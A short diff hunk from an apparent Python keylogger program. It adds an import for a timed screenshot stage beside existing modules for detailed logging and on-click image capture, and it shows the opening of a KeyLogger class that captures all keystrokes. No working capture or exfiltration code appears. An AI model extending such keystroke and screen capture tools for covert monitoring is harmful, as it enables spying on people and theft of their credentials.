@@ -53,6 +53,7 @@ from myutils import _settings, _cmdoptions, _mainapp
 # event processing threads
 from detailedlogwriter import DetailedLogWriterFirstStage
 from onclickimagecapture import OnClickImageCaptureFirstStage
+from timedscreenshot import TimedScreenshotFirstStage
 
 class KeyLogger:
     '''Captures all keystrokes, enqueue events.
